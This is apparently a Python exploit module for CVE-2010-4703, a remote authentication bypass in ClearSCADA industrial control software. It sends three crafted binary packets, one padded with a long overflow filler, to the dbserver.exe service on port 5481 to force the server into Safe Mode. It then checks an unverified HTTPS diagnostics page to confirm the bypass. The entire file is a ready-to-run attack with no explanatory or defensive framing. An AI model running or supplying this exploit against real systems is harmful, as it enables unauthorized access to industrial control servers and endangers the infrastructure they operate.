import socket
import ssl
import http.client
import time
from utils.logger import setup_logger

logger = setup_logger()

def send_exception_packets(target: str, port: int = 5481) -> bool:
    """
    Sends crafted packets to ClearSCADA dbserver.exe to trigger Safe Mode
    """
    try:
        pkt_1 = (
            b"\xfb\x0e\x45\x06\x0e\x00\x00\x00\x18\x00\x00\x00"
            b"\x49\x00\x50\x00\x20\x00\x31\x00\x32\x00\x37\x00\x2e\x00\x30\x00"
            b"\x2e\x00\x30\x00\x2e\x00\x31\x00\x2c\x00\x20\x00\x53\x00\x65\x00"
            b"\x73\x00\x73\x00\x69\x00\x6f\x00\x6e\x00\x20\x00\x30\x00\x00\x00"
            b"\x08\x00\x00\x00"
        )

        pkt_2 = (
            b"\x00\x00\x00\x00"
            b"\x26\x00\x00\x00"
            b"\x08\x00\x00\x00\x0f\x00\x00\x00\x43\x00\x72\x00\x79\x00\x73\x00"
            b"\x74\x00\x61\x00\x6c\x00\x52\x00\x65\x00\x70\x00\x6f\x00\x72\x00"
            b"\x74\x00\x73\x00\x00\x00"
        )

        pkt_3 = b"\x00" * 32 + b"\xd7\x01\x00\x00" + b"\x41" * 256

        with socket.create_connection((target, port), timeout=5) as sock:
            sock.sendall(pkt_1)
            time.sleep(0.5)
            sock.sendall(pkt_2)
            time.sleep(0.5)
            sock.sendall(pkt_3)
            logger.info("[+] Sent exception packets to trigger Safe Mode")
        return True
    except Exception as e:
        logger.error(f"[!] Failed to send exception packets: {e}")
        return False

def check_safe_mode(target: str, port: int = 443) -> bool:
    """
    Checks if ClearSCADA has entered Safe Mode (access to /diag/Info)
    """
    try:
        conn = http.client.HTTPSConnection(target, port, timeout=5,
                                           context=ssl._create_unverified_context())
        conn.request("GET", "/diag/Info")
        resp = conn.getresponse()
        data = resp.read()
        conn.close()
        if resp.status == 200 and b"Safe Mode" in data:
            logger.info("[+] ClearSCADA is in SAFE MODE")
            return True
        elif resp.status == 200:
            logger.info("[+] /diag/Info is accessible — likely SAFE MODE")
            return True
        else:
            logger.info(f"[-] Status code {resp.status}: {resp.reason}")
    except Exception as e:
        logger.error(f"[!] Failed to check safe mode: {e}")
    return False

def exploit(target: str, port: int = 5481):
    """
    ClearSCADA Remote Auth Bypass – Jeremy Brown
    CVE: CVE-2010-4703
    """
    logger.info(f"[*] Exploiting ClearSCADA on {target}:{port}")
    
    if check_safe_mode(target):
        logger.info("[*] Already in Safe Mode, exploitation unnecessary")
        return True

    if not send_exception_packets(target, port):
        return False

    time.sleep(2)
    if check_safe_mode(target):
        logger.info(f"[+] Exploit successful — visit https://{target}/diag/Info")
        return True

    logger.error("[-] Exploit failed — server did not enter Safe Mode")
    return False
